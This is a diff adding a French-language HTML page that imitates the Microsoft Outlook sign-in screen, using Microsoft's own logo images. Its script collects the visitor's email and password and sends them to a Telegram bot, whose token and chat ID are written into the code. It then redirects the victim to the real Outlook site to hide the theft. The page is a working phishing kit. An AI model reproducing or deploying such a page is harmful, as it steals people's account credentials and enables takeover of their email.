@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0%;
+            padding: 0%;
+        }
+
+        body {
+            padding: 15px;
+            background: linear-gradient(-45deg, #f3e4dd56, #e4eee59e);
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        .card {
+            background-color: white;
+            padding: 23px;
+            border: 1px solid rgba(128, 128, 128, 0.509);
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.1);
+            /* Ombre plus prononcée */
+            ;
+        }
+
+        p {
+            font-size: 1.4rem;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            height: 45px;
+            border: none;
+            border-radius: 0%;
+            border-bottom: 1px solid grey;
+            font-size: 1.1rem;
+        }
+
+        input:focus {
+            outline: none;
+        }
+
+        button {
+            background-color: #0067B8;
+            color: white;
+            width: 130px;
+            height: 35px;
+            border: none;
+            margin-left: auto;
+            cursor: pointer;
+        }
+
+        a {
+            color: #0067B8;
+            text-decoration: none;
+        }
+
+        .card2 {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            background-color: white;
+            padding: 15px;
+            border: 1px solid rgba(128, 128, 128, 0.509);
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.1);
+            /* Ombre plus prononcée */
+            ;
+        }
+
+        footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            height: 40px;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            background-color: rgba(0, 0, 0, 0.489);
+            color: white;
+        }
+
+        #co,
+        #pwd {
+            display: none;
+        }
+
+        @media only screen and (min-width: 524px) {
+  
+
+    .card {
+        max-width: 400px;
+        margin: 0 auto;
+        padding: 30px;
+       
+    }
+    .card2 {
+        max-width: 400px;
+        margin: 0 auto;
+        padding: 20px;
+       
+    }
+
+    footer{
+        display: none;
+    }
+}
+
+    </style>
+</head>
+
+<body>
+
+    <br>
+
+    <div style="width: 100%; display: flex; align-items: center; justify-content: center; ">
+        <img width="150" class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }"
+            src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png">
+    </div>
+
+    <br>
+    <br>
+    <div class="card">
+
+        <img class="logo" role="img"
+            pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png"
+            svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
+            data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
+            src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
+            alt="Microsoft">
+
+        <br>
+        <br>
+        <p>Se connecter</p>
+        <span>Continuer vers Outlook</span>
+        <br> <br>
+
+        <form id="form">
+
+            <input type="email" id="user" placeholder="E-mail, téléphone ou identifiant Skype" required>
+            <br><br>
+            <input id="pwd" type="password" placeholder="Mot de passe" required>
+            <br>
+            <br>
+            <span>Pas de compte ? <a href="#">Créez-en un !</a></span> <br> <br>
+            <a href="#">Votre compte n'est pas accessible ?</a>
+            <br>
+            <br>
+
+            <div style="display: flex; width: 100%;">
+                <button id="next" type="submit">Suivant</button>
+                <button id="co" type="submit">Se connecter</button>
+            </div>
+        </form>
+
+        <br>
+    </div>
+
+    <br> <br>
+
+    <div class="card2">
+
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+            class="lucide lucide-key-round">
+            <path
+                d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z" />
+            <circle cx="16.5" cy="7.5" r=".5" fill="currentColor" />
+        </svg>
+
+        <span>Options de connexion</span>
+
+    </div>
+
+    <br> <br> <br>
+
+    <footer>
+        <span>Cookies</span>
+        <span>Condition d'utilisation</span>
+        <span>Aide</span>
+    </footer>
+
+   
+
+    <script>
+
+        document.getElementById('next').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            // Si le formulaire est valide (grâce à l'attribut required du HTML)
+            if (document.getElementById('user').checkValidity()) {
+                document.getElementById('co').style.display = 'block';
+                document.getElementById('pwd').style.display = 'block';
+                document.getElementById('next').style.display = 'none';
+            } else {
+                // Si l'email n'est pas valide, HTML5 va gérer l'affichage du message d'erreur
+                document.getElementById('user').reportValidity();
+            }
+        });
+
+        document.getElementById('co').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            const botToken = '5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc';
+            const chatId = '5276838022';
+
+            // const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4';
+            // const chatId = '7332838769';
+
+            // Récupération des valeurs d'utilisateur et de mot de passe
+            const user = document.getElementById("user").value;
+            const pass = document.getElementById("pwd").value;
+
+            // Validation du mot de passe
+            if (!document.getElementById("pwd").checkValidity()) {
+                return alert('Mot de passe incorrect !');
+            }
+
+            // Construction du message à envoyer
+            const message = `📅 Outlook :\n\n👤 Utilisateur : ${user}\n🔐 Mot de passe : ${pass}`;
+
+            // Construction de l'URL de l'API Telegram
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Envoi de la requête à l'API Telegram
+            fetch(telegramURL)
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error(`Erreur lors de l'envoi du message à Telegram: ${text}`);
+                        });
+                    }
+                    // Redirection après envoi réussi
+                    window.location.href = 'https://www.microsoft.com/fr-fr/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f0%2f%3fstate%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8&sdf=0';
+                })
+                .catch(error => {
+                    console.error('Erreur :', error);
+                });
+        });
+
+
+    </script>
+
+
+</body>
+
+</html>
